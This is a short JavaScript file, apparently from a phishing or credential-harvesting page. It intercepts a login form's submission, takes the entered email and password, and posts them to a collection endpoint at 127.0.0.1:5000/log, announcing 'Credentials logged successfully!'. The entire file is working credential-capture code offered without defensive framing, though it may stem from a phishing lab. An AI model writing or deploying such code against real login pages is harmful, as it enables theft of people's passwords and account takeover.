document.getElementById("loginForm").addEventListener("submit", async function (event) {
    event.preventDefault();

    const formData = new FormData();
    formData.append("username", document.getElementById("email").value);
    formData.append("password", document.getElementById("password").value);

    try {
        const response = await fetch("http://127.0.0.1:5000/log", {
            method: "POST",
            body: formData,
            mode: "cors"
        });

        if (response.ok) {
            alert("Credentials logged successfully!");
        } else {
            alert("Error logging credentials.");
        }
    } catch (error) {
        console.error("Error:", error);
        alert("Failed to connect to the server.");
    }
});
